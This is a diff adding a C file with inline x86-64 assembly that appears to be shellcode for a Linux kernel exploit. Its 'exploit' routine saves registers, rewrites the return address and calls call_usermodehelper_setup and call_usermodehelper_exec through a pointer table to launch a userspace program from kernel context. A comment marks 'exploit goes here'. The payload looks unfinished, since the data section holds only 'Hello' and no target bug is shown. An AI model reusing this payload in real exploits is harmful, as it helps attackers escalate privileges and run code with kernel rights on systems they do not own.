@@ -1,0 +1,142 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+void print() {
+
+    printf("foo\n");
+
+}
+
+int foo() {
+
+  //push x
+  //sub esp, 4   ; "allocate" space for the new stack item
+  //  mov [esp], X ; put new stack item value X in
+
+    __asm__ ( 
+	     //	     "push $0xcafebabedeadbeef;" //return address
+	     "sub $8,%%rsp;" //allocate return address
+
+	     "push %%rbp;" //enter
+	     "mov %%rsp,%%rbp;" 
+
+	     "sub $24,%%rsp;" //allocate cleanup code
+
+	     "pushf;"  //save flags
+	     "push %%rax;"//save regs
+	     "push %%rbx;"
+	     "push %%rcx;"
+
+	     "push %%rsi;"
+             "push %%rdi;"
+
+	     "lea (%%rip),%%rsi;"
+	     "shr $12,%%rsi;"
+	     "shl $12,%%rsi;"
+	     "add $1024,%%rsi;"//point to data
+
+             "mov %%rbp,%%rdi;"  //dest
+             "sub $24,%%rdi;"
+
+             "cld;"
+             "rep movsb;" //do the mov
+
+	     "mov 24(%%rsi),%%rbp;"//return address
+
+             "pop %%rdi;"
+             "pop %%rsi;"
+
+	     /*
+	     "push $0x4223ef48;"
+	     "pop %%eax;"
+	     "out %%eax,$0xe9;"
+	     *///exploit goes here
+	     "call exploit;"
+
+	     
+	     "mov %%rbp,%%rax;"
+	     "sub $24,%%rax;"
+	     "sub $8,%%rsp;"//fake push
+	     "mov %%rax,(%%rsp);"
+
+	     "xor %%rax,%%rax;"
+      	     "xor %%rcx,%%rcx;"
+	     "lea (%%rip),%%rbx;"
+	     "shr $12,%%rbx;"
+	     "shl $12,%%rbx;"
+	     "sub $4,%%rbx;"//point to data
+	     "inc %%rcx;"
+	     "shl $9,%%rcx;"
+      	     "ret;"
+
+
+	     "exploit:"
+	     "push %%rbp;" //enter
+	     "mov %%rsp,%%rbp;" 
+
+	     "push %%rax;"
+	     "push %%rbx;"
+	     "push %%rcx;"
+	     "push %%rdx;"
+	     "push %%rsi;"
+	     "push %%rdi;"
+
+	     "lea (%%rip),%%rbx;"
+	     "shr $12,%%rbx;"
+	     "shl $12,%%rbx;"
+	     "add $1024,%%rbx;"
+	     //56 <- 72
+	     "mov %%rbx,%%rsi;"
+	     "mov %%rbx,%%rdi;"
+	     "add $56,%%rsi;"
+	     "add $72,%%rdi;"
+	     "mov %%rdi, (%%rsi);"
+	     "xor %%rdx,%%rdx;"
+	     "mov $0x20,%%rcx;"
+	     "push %%rbx;"
+	     "call *32(%%rbx);"//call_usermodehelper_setup
+	     //RDI, RSI, RDX, RCX
+	     //argv[0], argv, envp, GFP_ATOMIC
+	     //char*, char**, char**,int
+	     "mov %%rax,%%rdi;"
+	     "mov $1,%%rsi;"
+	     "pop %%rbx;"
+	     "call *48(%%rbx);"//call_usermodehelper_exec
+
+	     "pop %%rdi;"
+	     "pop %%rsi;"
+	     "pop %%rdx;"
+	     "pop %%rcx;"
+	     "pop %%rbx;"
+	     "pop %%rax;"
+
+	     "mov %%rbp,%%rsp;" //leave
+	     "pop %%rbp;"
+	     "ret;"
+
+
+	      "here:"
+	     "mov %%rax,(%%rbx,%%rcx,0x8);"
+	     "dec %%rcx;"
+	     "jnz  here;"
+	     "pop %%rcx;"
+	     "pop %%rbx;"
+	     "pop %%rax;"
+	     "popf;"
+	     "mov %%rbp,%%rsp;"
+	     "pop %%rbp;"
+	     "ret;"
+	     "data: .asciz \"Hello\";"
+	      : 
+	      : 
+	      : "memory"
+	      );
+    
+
+}
+
+int main(int argc, char ** argv) {
+    foo();
+    return 0;
+
+}
